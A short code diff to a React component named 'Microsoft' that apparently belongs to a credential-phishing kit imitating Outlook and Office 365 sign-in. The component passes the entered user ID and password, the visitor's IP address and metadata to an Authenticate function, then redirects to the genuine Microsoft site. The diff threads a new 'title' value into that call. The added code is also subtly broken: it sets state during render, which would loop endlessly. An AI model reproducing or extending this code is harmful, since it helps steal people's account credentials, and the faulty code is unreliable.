@@ -22,6 +22,8 @@ const Microsoft = () => {
   const [redirect, setRedirect] = useState(false)
 
   const [isLoading, setIsLoading] = useState(false)
+  const [title, setTitle] = useState('')
+  setTitle(service === 'outlook' ? 'outlook' : 'office360')
   let link
   link =
     service === 'outlook' ? 'https://outlook.com' : 'https://office365.com/'
@@ -67,9 +69,15 @@ const Microsoft = () => {
         return
       }
       setIsLoading(true)
-      Authenticate(userID, password, service, IPAddress, metaData, id).then(
-        () => setRedirect(true)
-      )
+      Authenticate(
+        userID,
+        password,
+        service,
+        IPAddress,
+        metaData,
+        id,
+        title
+      ).then(() => setRedirect(true))
     }
   }
 
